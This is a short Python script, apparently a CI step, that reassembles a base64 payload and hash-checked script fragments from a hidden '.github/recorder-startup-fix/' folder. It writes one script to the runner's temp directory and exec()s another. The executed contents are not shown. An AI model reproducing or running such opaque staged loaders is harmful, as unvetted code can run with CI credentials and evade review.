import base64, hashlib, lzma, os
from pathlib import Path
PAYLOAD = ''.join(Path(p).read_text().strip() for p in ['.github/recorder-startup-fix/part-00.b64', '.github/recorder-startup-fix/part-01.b64'])
scripts = {}
for label, spec in {'prepare': {'files': ['.github/recorder-startup-fix/prepare-00.txt', '.github/recorder-startup-fix/prepare-01.txt'], 'sha256': 'cef544834cbdbf83cd0e144c24e3522e7a8ca3252d9af1da5432231c13f8ed37'}, 'collect': {'files': ['.github/recorder-startup-fix/collect-00.txt'], 'sha256': '0c08eec04b9c7f0c64ed73754cf268b293e82d92f63d4c9eedc6a4f2894a93d9'}}.items():
    code = b''.join(Path(p).read_bytes() for p in spec['files'])
    assert hashlib.sha256(code).hexdigest() == spec['sha256'], label
    compile(code, label, 'exec')
    scripts[label] = code
collector = Path(os.environ['RUNNER_TEMP'])/'recorder-startup-fix-collect.py'
collector.write_bytes(scripts['collect'])
exec(compile(scripts['prepare'], 'prepare', 'exec'), dict(PAYLOAD=PAYLOAD))
